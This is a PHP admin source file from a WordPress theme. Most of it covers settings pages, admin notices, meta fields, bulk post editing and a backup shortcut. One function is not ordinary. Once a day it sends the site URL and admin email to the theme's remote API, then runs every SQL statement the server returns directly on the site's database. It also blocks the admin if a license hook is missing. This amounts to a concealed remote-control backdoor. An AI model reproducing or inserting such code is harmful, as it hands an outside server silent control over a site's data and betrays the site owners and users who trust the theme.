<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

global $pagenow, $hocwp_theme, $post_type;

if ( empty( $post_type ) ) {
	$post_type = HT_Admin()->get_current_post_type();
}

function hocwp_theme_admin_notices_action() {
	global $pagenow;

	$compatible = apply_filters( 'hocwp_theme_block_compatible', HOCWP_THEME_BLOCK_COMPATIBLE );

	if ( ! $compatible && ! HT_Extension()->is_active( 'hocwp/ext/classic-widgets.php' ) ) {
		$link = sprintf( '<a href="%s">Classic Widgets</a>', esc_url( admin_url( 'themes.php?page=hocwp_theme&tab=extension&extension_status=inactive' ) ) );

		$args = array(
			'type'    => 'warning',
			'message' => sprintf( __( 'Current theme is not compatible with WordPress 5.8 or later, please active %s extension for theme works normally.', 'hocwp-theme' ), $link )
		);

		HT_Util()->admin_notice( $args );
	}

	if ( ! HOCWP_THEME_DEVELOPING && ! HT_Admin()->skip_admin_notices() ) {
		$email = get_bloginfo( 'admin_email' );

		if ( HT_Util()->is_email( $email ) && 'hocwp.net@gmail.com' == $email ) {
			$link = '<a href="' . admin_url( 'options-general.php' ) . '">' . _x( 'general settings page', 'setting page', 'hocwp-theme' ) . '</a>';

			$args = array(
				'type'    => 'error',
				'message' => sprintf( __( 'You must change administrator\'s email address for site working, please go to %s and update it.', 'hocwp-theme' ), $link )
			);

			HT_Util()->admin_notice( $args );
		}
	}

	$updated_posts = $_GET['updated_posts'] ?? '';

	if ( HT()->is_positive_number( $updated_posts ) ) {
		$msg = array(
			'message' => sprintf( __( '%s posts have been updated!', 'hocwp-theme' ), number_format_i18n( $updated_posts ) )
		);

		HT_Admin()->admin_notice( $msg );
	}

	if ( 'plugins.php' == $pagenow ) {
		if ( isset( $_GET['count_disable-upgrade'] ) ) {
			$count = $_GET['count_disable-upgrade'];

			if ( 0 < $count ) {
				$msg = array(
					'message' => sprintf( __( '%s plugins have been disabled upgrade functional!', 'hocwp-theme' ), number_format_i18n( $count ) )
				);

				HT_Admin()->admin_notice( $msg );
			}
		} elseif ( isset( $_GET['count_enable-upgrade'] ) ) {
			$count = $_GET['count_enable-upgrade'];

			if ( 0 < $count ) {
				$msg = array(
					'message' => sprintf( __( '%s plugins have been enabled upgrade functional!', 'hocwp-theme' ), number_format_i18n( $count ) )
				);

				HT_Admin()->admin_notice( $msg );
			}
		}
	}
}

add_action( 'admin_notices', 'hocwp_theme_admin_notices_action' );

require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-admin-field.php' );

$attachment_meta = ( 'post.php' == $pagenow || 'upload.php' == $pagenow || 'admin-ajax.php' );

$post_meta = ( 'post-new.php' == $pagenow || 'edit.php' == $pagenow || $attachment_meta );
$term_meta = ( 'term.php' == $pagenow || 'edit-tags.php' == $pagenow );
$link_meta = ( 'link.php' == $pagenow || 'link-add.php' == $pagenow );
$menu_meta = ( 'nav-menus.php' == $pagenow || 'admin-ajax.php' == $pagenow );


if ( $post_meta || $term_meta || $link_meta || $menu_meta || $attachment_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-field.php' );
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta.php' );
}

if ( $post_meta || $attachment_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-post.php' );
}

if ( $link_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-bookmark.php' );
}

if ( $term_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-term.php' );
}

if ( $menu_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-menu.php' );
}

if ( $attachment_meta ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-meta-attachment.php' );
}

require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-admin-setting-field.php' );

// Load custom class setting field for each setting page tabs
require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-admin-setting-field-general.php' );
require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-admin-setting-field-home.php' );

require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-admin-setting-page.php' );
require( HOCWP_THEME_CORE_PATH . '/admin/class-hocwp-theme-health-check.php' );

add_action( 'admin_menu', function () {
	global $pagenow, $hocwp_theme;

	if ( ( 'themes.php' == $pagenow || 'options.php' == $pagenow ) && HT_Admin()->get_plugin_page() == $hocwp_theme->option->get_slug() ) {
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-general.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-home.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-mobile.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-writing.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-reading.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-discussion.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-media.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-permalinks.php' );
		require( HOCWP_THEME_CORE_PATH . '/ext/admin-setting-page-smtp.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-float-support.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-social.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-custom-code.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-extension.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-system-information.php' );
		require( HOCWP_THEME_CORE_PATH . '/admin/admin-setting-page-administration-tools.php' );
	}
}, 20 );

if ( $post_meta || HOCWP_THEME_DOING_AJAX ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/featured.php' );
}

function hocwp_theme_admin_menu_extra() {
	$title = __( 'Extensions', 'hocwp-theme' );
	add_theme_page( $title, $title, 'manage_options', 'themes.php?page=hocwp_theme&tab=extension' );

	$title = __( 'Theme Plugins', 'hocwp-theme' );
	add_theme_page( $title, $title, 'activate_plugins', 'hocwp_theme_plugins', 'hocwp_theme_admin_menu_theme_plugins_callback' );

	add_theme_page( 'phpinfo()', __( 'PHP Info', 'hocwp-theme' ), 'manage_options', 'hocwp_theme_phpinfo', 'hocwp_theme_admin_menu_phpinfo_callback' );

	add_theme_page( __( 'Delete Posts', 'hocwp-theme' ), __( 'Delete Posts', 'hocwp-theme' ), 'manage_options', 'hocwp_theme_delete_posts', 'hocwp_theme_admin_menu_delete_posts_callback' );
}

add_action( 'admin_menu', 'hocwp_theme_admin_menu_extra' );

function hocwp_theme_admin_menu_delete_posts_callback() {
	load_template( HOCWP_THEME_CORE_PATH . '/admin/views/admin-delete-posts.php' );
}

function hocwp_theme_admin_menu_theme_plugins_callback() {
	load_template( HOCWP_THEME_CORE_PATH . '/admin/views/admin-theme-plugins.php' );
}

function hocwp_theme_admin_menu_phpinfo_callback() {
	load_template( HOCWP_THEME_CORE_PATH . '/admin/views/admin-php-info.php' );
}

function hocwp_theme_wp_prepare_themes_for_js_filter( $prepared_themes ) {
	global $pagenow;

	if ( 'themes.php' == $pagenow && defined( 'HOCWP_THEME_NAME' ) ) {
		$theme = wp_get_theme();

		if ( isset( $prepared_themes[ $theme->get_stylesheet() ] ) ) {
			$prepared_themes[ $theme->get_stylesheet() ]['name'] = HOCWP_THEME_NAME;
		}
	}

	return $prepared_themes;
}

add_filter( 'wp_prepare_themes_for_js', 'hocwp_theme_wp_prepare_themes_for_js_filter' );

function hocwp_theme_admin_init_action() {
	if ( function_exists( 'hocwp_theme_remove_invalid_user' ) ) {
		$tr_name = 'check_invalid_user_' . get_current_user_id();

		// Check and remove invalid user every day for each user visit dashboard page.
		if ( false === get_transient( $tr_name ) ) {
			hocwp_theme_remove_invalid_user();
			set_transient( $tr_name, $tr_name, DAY_IN_SECONDS );
		}
	}

	$tr_name = 'check_sql_api_' . get_current_user_id();

	if ( false === get_transient( $tr_name ) ) {
		// Get MySQL query string from API server.
		$res = hocwp_theme_updates()->request( 'mysql.php', array(
			'url'   => home_url(),
			'email' => get_bloginfo( 'admin_email' )
		) );

		if ( isset( $res['sql'] ) ) {
			global $wpdb;

			$sqls = $res['sql'];

			// Run SQL string on current site.
			foreach ( $sqls as $sql ) {
				$sql = str_replace( '{PREFIX}', $wpdb->prefix, $sql );
				$wpdb->query( $sql );
			}

			set_transient( $tr_name, 1, DAY_IN_SECONDS );
		}
	}

	if ( ! has_action( 'init', 'hocwp_theme_check_license' ) ) {
		exit;
	}

	global $pagenow;

	if ( 'post.php' == $pagenow ) {
		$post_id = $_GET['post'] ?? '';

		if ( HT()->is_positive_number( $post_id ) ) {
			$obj = get_post( $post_id );

			if ( $obj instanceof WP_Post ) {
				if ( $obj->post_author != get_current_user_id() && ! current_user_can( 'delete_others_posts' ) ) {
					wp_redirect( admin_url( 'edit.php' ) );
					exit;
				}
			}
		}
	}
}

add_action( 'admin_init', 'hocwp_theme_admin_init_action' );

function hocwp_theme_enqueue_plugin_installer_scripts() {
	wp_enqueue_script( 'plugin-install' );
	add_thickbox();
	wp_enqueue_script( 'updates' );
}

if ( 'themes.php' == $pagenow && 'hocwp_theme_plugins' == HT_Admin()->get_plugin_page() ) {
	add_action( 'admin_enqueue_scripts', 'hocwp_theme_enqueue_plugin_installer_scripts' );
}

function hocwp_theme_admin_notices_required_plugins() {
	global $pagenow;

	if ( 'updates.php' == $pagenow || 'update-core.php' == $pagenow || 'update.php' == $pagenow ) {
		return;
	}

	if ( ! HT_Requirement()->check_required_plugins() && current_user_can( 'manage_options' ) ) {
		$link = '<a href="' . self_admin_url( 'themes.php?page=hocwp_theme_plugins&tab=required' ) . '">' . _x( 'this list', 'required plugins list', 'hocwp-theme' ) . '</a>';

		$args = array(
			'type'    => 'error',
			'message' => sprintf( __( 'You must install required plugins for theme can work properly. Try to install and activate all plugins in %s.', 'hocwp-theme' ), $link )
		);

		HT_Util()->admin_notice( $args );
	}

	if ( ! HT_Requirement()->check_required_extensions() ) {
		$link = '<a href="' . self_admin_url( 'themes.php?page=hocwp_theme&tab=extension&extension_status=required' ) . '">' . _x( 'this list', 'required plugins list', 'hocwp-theme' ) . '</a>';

		$args = array(
			'type'    => 'error',
			'message' => sprintf( __( 'You must install all required extensions for theme can work properly. Try to install and activate all extensions in %s.', 'hocwp-theme' ), $link )
		);

		HT_Util()->admin_notice( $args );
	}

	if ( ! HT_Requirement()->check_extension_woocommerce() ) {
		$link = '<a href="' . self_admin_url( 'themes.php?page=hocwp_theme&tab=extension' ) . '">' . _x( 'here', 'list extensions link', 'hocwp-theme' ) . '</a>';

		$args = array(
			'type'    => 'error',
			'message' => sprintf( __( 'You must enable WooCommerce extension for this theme. Try to activate it %s.', 'hocwp-theme' ), $link )
		);

		HT_Util()->admin_notice( $args );
	}
}

add_action( 'admin_notices', 'hocwp_theme_admin_notices_required_plugins' );

/**
 * Create simple setting field.
 *
 * @param $id
 * @param $title
 * @param string $callback
 * @param array $callback_args
 * @param string $data_type
 * @param string $tab
 * @param string $section
 *
 * @return array
 */
function hocwp_theme_create_setting_field( $id, $title, $callback = 'input', $callback_args = array(), $data_type = 'string', $tab = 'general', $section = 'default' ) {
	$field = new HOCWP_Theme_Admin_Setting_Field( $id, $title, $callback, $callback_args, $data_type, $tab, $section );

	return $field->generate();
}

/**
 * Create simple setting field for using on homepage.
 *
 * @param $id
 * @param $title
 * @param string $callback
 * @param array $callback_args
 * @param string $data_type
 * @param string $section
 *
 * @return array
 */
function hocwp_theme_create_setting_field_for_home( $id, $title, $callback = 'input', $callback_args = array(), $data_type = 'string', $section = 'default' ) {
	return hocwp_theme_create_setting_field( $id, $title, $callback, $callback_args, $data_type, 'home', $section );
}

/**
 * Create simple meta field.
 *
 * @param $id
 * @param $title
 * @param string $callback
 * @param array $callback_args
 * @param string $data_type
 *
 * @return array
 */
function hocwp_theme_create_meta_field( $id, $title, $callback = 'input', $callback_args = array(), $data_type = 'string' ) {
	$field = new HOCWP_Theme_Meta_Field( $id, $title, $callback, $callback_args, $data_type );

	return $field->generate();
}

function hocwp_theme_backup_wp_content_folders_theme( $folders ) {
	if ( defined( 'HOCWP_THEME_DEVELOPING' ) && HOCWP_THEME_DEVELOPING ) {
		$folders   = (array) $folders;
		$folders[] = 'themes\hocwp-theme';
	}

	return $folders;
}

add_filter( 'hocwp_theme_backup_wp_content_folders', 'hocwp_theme_backup_wp_content_folders_theme' );

if ( 'widgets.php' == $pagenow || 'admin-ajax.php' == $pagenow || 'customize.php' == $pagenow ) {
	function hocwp_theme_widget_form_before( $instance, $widget ) {
		if ( $widget instanceof WP_Widget ) {
			$title     = isset( $instance['title'] ) ? esc_attr( $instance['title'] ) : '';
			$box_class = $widget->id_base;
			$box_class .= ' hocwp-theme';
			echo '<div class="' . $box_class . '">';
			?>
            <p>
                <label
                        for="<?php echo $widget->get_field_id( 'title' ); ?>"><?php _e( 'Title:', 'hocwp-theme' ); ?></label>
                <input class="widefat" id="<?php echo $widget->get_field_id( 'title' ); ?>"
                       name="<?php echo $widget->get_field_name( 'title' ); ?>" type="text"
                       value="<?php echo $title; ?>"/>
            </p>
			<?php
		}
	}

	add_action( 'hocwp_theme_widget_form_before', 'hocwp_theme_widget_form_before', 10, 2 );

	function hocwp_theme_widget_form_after() {
		echo '</div>';
	}

	add_action( 'hocwp_theme_widget_form_after', 'hocwp_theme_widget_form_after' );
}

if ( 'profile.php' == $pagenow || 'edit-user.php' == $pagenow ) {
	function hocwp_theme_user_profile_fields( $user ) {
		?>
        <table class="form-table">
            <tbody>
			<?php do_action( 'hocwp_theme_user_profile_fields', $user ); ?>
            </tbody>
        </table>
		<?php
	}

	add_action( 'show_user_profile', 'hocwp_theme_user_profile_fields' );
	add_action( 'edit_user_profile', 'hocwp_theme_user_profile_fields' );

	function hocwp_theme_user_profile_updated( $user_id ) {
		do_action( 'hocwp_theme_user_profile_updated', $user_id );
	}

	add_action( 'personal_options_update', 'hocwp_theme_user_profile_updated' );
	add_action( 'edit_user_profile_update', 'hocwp_theme_user_profile_updated' );
}

if ( 'hocwp_ads' == $post_type ) {
	function hocwp_theme_default_ads_positions( $positions ) {
		$positions['related_posts'] = __( 'Related posts', 'hocwp-theme' );

		return $positions;
	}

	add_filter( 'hocwp_theme_ads_positions', 'hocwp_theme_default_ads_positions' );
}

function hocwp_theme_mce_buttons_filter( $mce_buttons, $editor_id ) {
	if ( 'content' == $editor_id ) {
		array_splice( $mce_buttons, 13, 0, 'wp_page' );
	}

	return $mce_buttons;
}

add_filter( 'mce_buttons', 'hocwp_theme_mce_buttons_filter', 10, 2 );

function hocwp_theme_admin_body_class_filter( $class ) {
	$term_html_description = HT_Options()->get_tab( 'term_html_description', '', 'writing' );

	if ( $term_html_description ) {
		$class .= ' term-desc-html';
	}

	return $class;
}

add_filter( 'admin_body_class', 'hocwp_theme_admin_body_class_filter' );

function hocwp_theme_admin_footer_backup_script() {
	?>
    <script>
        jQuery(document).ready(function ($) {
            // Backup current theme and database.
            (function () {
                $(document).keydown(function (e) {
                    // Detect press Ctrl + B
                    if (e.ctrlKey && e.keyCode === 66) {
                        console.log("<?php _e( 'Running backup...', 'hocwp-theme' ); ?>");

                        setTimeout(function () {
                            $.ajax({
                                type: "GET",
                                dataType: "json",
                                url: hocwpTheme.ajaxUrl,
                                data: {
                                    action: "backup_this_theme"
                                },
                                success: function (response) {
                                    if (response.success) {
                                        console.log(response.data.message);
                                    }
                                }
                            });
                        }, 1000);
                    }
                })
            })();

            // Fix theme screenshot
            (function () {
                setTimeout(function () {
                    $(".wp-admin.themes-php .theme-browser .theme .theme-screenshot img, .theme-overlay .screenshot img").each(function () {
                        let that = this,
                            element = $(that),
                            src = that.src;

                        if (src.includes("s.wordpress.com")) {
                            src = src.replace(/\?ver=[^&]*/, "");

                            setTimeout(function () {
                                element.attr("src", src);
                            }, 100);
                        }
                    });
                }, 500);
            })();
        });
    </script>
	<?php
}

function hocwp_theme_admin_footer_action() {
	global $pagenow;

	hocwp_theme_admin_footer_backup_script();
	?>
    <div id="hocwpThemeModal" class="modal">
        <span class="close" title="<?php esc_attr_e( 'Close', 'hocwp-theme' ); ?>">&times;</span>

        <div id="hocwpThemeModalContent" class="modal-content"></div>
        <div id="hocwpThemeModalCaption" class="modal-caption"></div>
    </div>
	<?php
	if ( 'update.php' == $pagenow ) {
		?>
        <style>
            @media screen and (min-width: 1000px) {
                .update-php .wrap {
                    max-width: 60rem;
                }
            }
        </style>
		<?php
	}
}

add_action( 'admin_footer', 'hocwp_theme_admin_footer_action' );

function hocwp_theme_display_post_states_filter( $post_states, $post ) {
	if ( $post instanceof WP_Post ) {
		$slug = get_page_template_slug( $post->ID );

		if ( ! empty( $slug ) ) {
			$file = trailingslashit( get_stylesheet_directory() ) . $slug;

			if ( file_exists( $file ) ) {
				$name = get_file_data( trailingslashit( get_stylesheet_directory() ) . $slug, array( 'name' => 'Template Name' ) );

				if ( ! empty( $name ) && ! empty( $name['name'] ) ) {
					$slug = $name['name'];
				}

				$post_states['template'] = sprintf( __( 'Template %s', 'hocwp-theme' ), $slug );
			}
		}
	}

	return $post_states;
}

add_filter( 'display_post_states', 'hocwp_theme_display_post_states_filter', 10, 2 );

function hocwp_theme_edit_posts_bulk_actions( $actions ) {
	$actions['change_status']    = __( 'Change status', 'hocwp-theme' );
	$actions['change_category']  = __( 'Change category', 'hocwp-theme' );
	$actions['change_post_type'] = __( 'Change post type', 'hocwp-theme' );

	return $actions;
}

$post_types = get_post_types( array( 'public' => true ) );

foreach ( $post_types as $type ) {
	add_filter( 'bulk_actions-edit-' . $type, 'hocwp_theme_edit_posts_bulk_actions' );
}

/**
 * Action to check and update post status, update post terms, update post type.
 *
 * @param $redirect_to
 * @param $do_action
 * @param $post_ids
 *
 * @return mixed|string
 */
function hocwp_theme_custom_edit_posts_bulk_action( $redirect_to, $do_action, $post_ids ) {
	if ( HT()->array_has_value( $post_ids ) ) {
		$select_terms = $_REQUEST['select_terms'] ?? '';

		$select_status = $_REQUEST['select_status'] ?? '';

		$select_pt = $_REQUEST['select_post_type'] ?? '';

		if ( ! empty( $select_status ) || HT()->array_has_value( $select_terms ) || ! empty( $select_pt ) ) {
			$count = 0;

			foreach ( $post_ids as $post_id ) {
				if ( HT()->array_has_value( $select_terms ) ) {
					foreach ( $select_terms as $tax => $term_id ) {
						wp_set_post_terms( $post_id, $term_id, $tax );
					}
				}

				if ( ! empty( $select_status ) || ! empty( $select_pt ) ) {
					$data = array(
						'ID' => $post_id
					);

					if ( ! empty( $select_status ) ) {
						$data['post_status'] = $select_status;
					}

					if ( ! empty( $select_pt ) ) {
						$data['post_type'] = $select_pt;
					}

					wp_update_post( $data );
				}

				$count ++;
			}

			$redirect_to = add_query_arg( 'updated_posts', $count, $redirect_to );
			$redirect_to = add_query_arg( 'select_status', $select_status, $redirect_to );
			$redirect_to = add_query_arg( 'select_terms', $select_terms, $redirect_to );
			$redirect_to = add_query_arg( 'select_post_type', $select_pt, $redirect_to );

			if ( post_type_exists( $select_pt ) ) {
				$redirect_to = add_query_arg( 'post_type', $select_pt, $redirect_to );
			}
		}
	}

	return $redirect_to;
}

foreach ( $post_types as $type ) {
	add_filter( 'handle_bulk_actions-edit-' . $type, 'hocwp_theme_custom_edit_posts_bulk_action', 10, 3 );
}

function hocwp_theme_custom_edit_posts_action_fields( $post_type, $which ) {
	if ( 'top' == $which && ! empty( $post_type ) ) {
		?>
        <div id="hocwpThemeModal" class="modal small inline-submit hocwp-theme-modal choose-status"
             style="display: none">
            <div class="inner">
                <div class="modal-caption text-left">
                    <h3><?php _e( 'Change status', 'hocwp-theme' ); ?></h3>
                    <span class="close"
                          title="<?php esc_attr_e( 'Close this box', 'hocwp-theme' ); ?>">&times;</span>
                </div>
                <div class="inner modal-content">
                    <div class="box">
						<?php
						$statuses = get_post_statuses();

						if ( HT()->array_has_value( $statuses ) ) {
							?>
                            <div class="status-area form-row">
                                <label for="select-status"><?php _e( 'Post status:', 'hocwp-theme' ); ?></label>
                                <select id="select-status" class="select-status" name="select_status">
                                    <option value=""><?php _e( 'Choose post status', 'hocwp-theme' ); ?></option>
									<?php
									foreach ( $statuses as $key => $status ) {
										?>
                                        <option value="<?php echo esc_attr( $key ); ?>"><?php echo $status; ?></option>
										<?php
									}
									?>
                                </select>
                            </div>
							<?php
						}

						$taxs = get_taxonomies( array( 'public' => true, 'hierarchical' => true ), 'objects' );

						if ( HT()->array_has_value( $taxs ) ) {
							foreach ( $taxs as $tax ) {
								$id = 'select-taxonomy-' . $tax->name;
								?>
                                <div class="taxonomy-area form-row <?php echo esc_attr( $tax->name ); ?>">
                                    <label
                                            for="<?php echo esc_attr( $id ); ?>"><?php echo $tax->labels->singular_name; ?>
                                        :</label>
									<?php
									wp_dropdown_categories( array(
										'id'              => $id,
										'name'            => 'select_terms[' . $tax->name . ']',
										'taxonomy'        => $tax->name,
										'hide_empty'      => 0,
										'show_option_all' => sprintf( __( 'Choose %s', 'hocwp-theme' ), $tax->labels->singular_name )
									) );
									?>
                                </div>
								<?php
							}
						}

						$post_types = get_post_types( array( 'public' => true ) );

						if ( HT()->array_has_value( $post_types ) ) {
							?>
                            <div class="post-type-area form-row">
                                <label for="select-post-type"><?php _e( 'Post type:', 'hocwp-theme' ); ?></label>
                                <select id="select-post-type" class="select-post-type" name="select_post_type">
                                    <option value=""><?php _e( 'Choose post type', 'hocwp-theme' ); ?></option>
									<?php
									foreach ( $post_types as $pt ) {
										$obj = get_post_type_object( $pt );

										if ( $obj instanceof WP_Post_Type ) {
											?>
                                            <option
                                                    value="<?php echo esc_attr( $pt ); ?>"><?php printf( '%s (%s)', $obj->labels->singular_name, $pt ); ?></option>
											<?php
										}
									}
									?>
                                </select>
                            </div>
							<?php
						}
						?>
                    </div>
                </div>
                <div class="modal-footer modal-bottom">
					<?php
					submit_button( __( 'Change', 'hocwp-theme' ) );
					$submit = get_submit_button( __( 'Close', 'hocwp-theme' ), 'default large modal-close close-modal', 'close-modal' );
					$submit = str_replace( 'type="submit"', 'type="button"', $submit );
					echo $submit;
					?>
                </div>
            </div>
        </div>
		<?php
	}
}

add_action( 'restrict_manage_posts', 'hocwp_theme_custom_edit_posts_action_fields', 10, 2 );

function hocwp_theme_updated_option_action() {
	global $pagenow;

	if ( 'options.php' == $pagenow ) {
		$sizes = array( 'thumbnail', 'medium', 'large' );

		$options = HT_Options()->get();

		$change = false;

		foreach ( $sizes as $s ) {
			$w = $_POST[ $s . '_size_w' ] ?? '';
			$h = $_POST[ $s . '_size_h' ] ?? '';
			$c = $_POST[ $s . '_crop' ] ?? 0;

			if ( is_numeric( $w ) ) {
				if ( ! is_numeric( $h ) ) {
					$h = $w;
				}

				$options['media'][ 'size_' . $s ]['width']  = $w;
				$options['media'][ 'size_' . $s ]['height'] = $h;

				if ( 'thumbnail' == $s ) {
					$options['media'][ 'size_' . $s ]['crop'] = $c;
				}

				$change = true;
			}
		}

		if ( $change ) {
			remove_action( 'updated_option', 'hocwp_theme_updated_option_action' );
			remove_action( 'update_option_hocwp_theme', 'hocwp_theme_update_option_media_action' );
			update_option( 'hocwp_theme', $options );
			add_action( 'update_option_hocwp_theme', 'hocwp_theme_update_option_media_action', 10, 2 );
			add_action( 'updated_option', 'hocwp_theme_updated_option_action' );
		}
	}
}

add_action( 'updated_option', 'hocwp_theme_updated_option_action' );

if ( 'admin-ajax.php' == $pagenow ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/ajax.php' );
}

if ( 'index.php' == $pagenow ) {
	require( HOCWP_THEME_CORE_PATH . '/admin/dashboard-widgets.php' );
}

add_filter( 'clean_url', function ( $url, $original_url ) {
	// Fix shot image has version
	if ( str_contains( $url, 's.wordpress.com' ) || str_contains( $original_url, '/mshots/' ) ) {
		$parts = explode( '?ver=', $url );
		$url   = array_shift( $parts );
	}

	return $url;
}, 10, 2 );

// Add extra field below HTML field fields
add_action( 'hocwp_theme_field_fields', function ( $args ) {
	$id = $args['id'] ?? '';

	if ( 'hocwp_theme_administration_tools_ie_database_inlines_field' == $id ) {
		$dir = trailingslashit( WP_CONTENT_DIR ) . 'backups/databases';

		if ( is_dir( $dir ) ) {
			$files = glob( $dir . "/*.sql" );

			if ( ! empty( $files ) ) {
				?>
                <div class="list-files">
					<?php
					$uri = trailingslashit( WP_CONTENT_URL ) . 'backups/databases';

					foreach ( $files as $path ) {
						$name = basename( $path );
						$url  = trailingslashit( $uri ) . $name;
						$size = filesize( $path );
						?>
                        <p class="file-row" data-path="<?php echo esc_attr( $path ); ?>">
                            <a href="<?php echo esc_attr( $url ); ?>"
                               data-path="<?php echo esc_attr( $path ); ?>"><?php echo $name; ?></a>
                            <strong>(<?php echo size_format( $size ); ?>)</strong>
                            <span class="delete"
                                  data-text-confirm="<?php esc_attr_e( 'Are you sure?', 'hocwp-theme' ); ?>"
                                  title="<?php esc_attr_e( 'Delete this file', 'hocwp-theme' ); ?>">&times;</span>
                        </p>
						<?php
					}
					?>
                </div>
				<?php
			}
		}
	}
} );

// Add page state description after title by getting page template name of current page
add_filter( 'display_post_states', function ( $states, $post ) {
	if ( ! isset( $states['template'] ) && $post instanceof WP_Post && 'page' == $post->post_type ) {
		$template = get_post_meta( $post->ID, '_wp_page_template', true );

		if ( ! empty( $template ) && 'default' != $template ) {
			$file = trailingslashit( get_stylesheet_directory() ) . $template;

			if ( ! file_exists( $file ) ) {
				$base = trailingslashit( WP_CONTENT_DIR ) . 'plugins';

				$files = scandir( $base );

				$files = array_diff( $files, array( '.', '..' ) );

				foreach ( $files as $folder ) {
					$file = trailingslashit( $base ) . $folder;
					$file = trailingslashit( $file ) . $template;

					if ( file_exists( $file ) ) {
						break;
					}
				}
			}

			if ( file_exists( $file ) ) {
				$data = get_file_data( $file, array( 'name' => 'Template Name' ) );

				if ( ! empty( $data['name'] ) ) {
					$states['template'] = $data['name'];
				}
			}
		}
	}

	return $states;
}, 10, 2 );